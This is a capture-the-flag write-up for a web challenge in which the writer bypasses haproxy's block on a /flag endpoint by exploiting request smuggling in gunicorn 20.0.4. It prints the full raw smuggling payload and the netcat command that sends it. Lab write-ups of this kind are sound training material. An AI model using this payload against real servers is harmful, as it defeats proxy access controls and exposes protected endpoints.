The challenge source code was provided, including the Dockerfile. We could
look at the source code first and try to access the application and see how it
works. The page served when accessing the URL:

![Alt text](https://github.com/uac-ctf/UA-CSW-
CTF2022-Writeups/blob/master/web/release_unicorn/images/home_page.png?raw=true)

Looking into the code, we can see that there more endpoints:

```python  
@app.route('/admin', methods=['GET', 'POST'])  
def admin():  
   return 'Under Construction...'

@app.route('/flag')  
def flag():  
   with open('flag', 'r') as f:  
       return f.read()  
```

If we try to access the */flag* endpoint, we get a **403 Forbidden**. The
challenge objective was to find a way to bypass the restriction mechanism
imposed in haproxy.  
The challenge title was a big clue to solve this challenge, and if we look
into the *requirements.txt* file, the gunicorn version is defined to *20.0.4*.

```python  
Flask  
flask_limiter  
gunicorn==20.0.4  
gunicorn[gevent]  
```

A quick Google search for vulnerabilities in this version, we will come across
this blog post, <https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-
smuggling/>. From here, we just need to adapt the payload to the challenge. A
possible solution would be:

```bash  
GET /admin HTTP/1.1  
Host: cybersecweek.ua.pt:2005  
Content-Length: 78  
Sec-Websocket-Key1: x

xxxxxxxxGET /flag HTTP/1.1  
Host: cybersecweek.ua.pt:2005  
Content-Length: 48

GET / HTTP/1.1  
Host: cybersecweek.ua.pt:2005

```

Then we need to send this request to the challenge:

```bash  
cat smuggle.txt | nc cybersecweek.ua.pt 2005  
# Results in  
HTTP/1.1 200 OK  
server: gunicorn/20.0.4  
date: Sun, 29 May 2022 20:14:33 GMT  
content-type: text/html; charset=utf-8  
content-length: 21

Under Construction...HTTP/1.1 200 OK  
server: gunicorn/20.0.4  
date: Sun, 29 May 2022 20:14:33 GMT  
content-type: text/html; charset=utf-8  
content-length: 45

CTFUA{Smuggl3_w1Th_gUn1c0rN_MTMzN1lvdVJvY2s=}  
```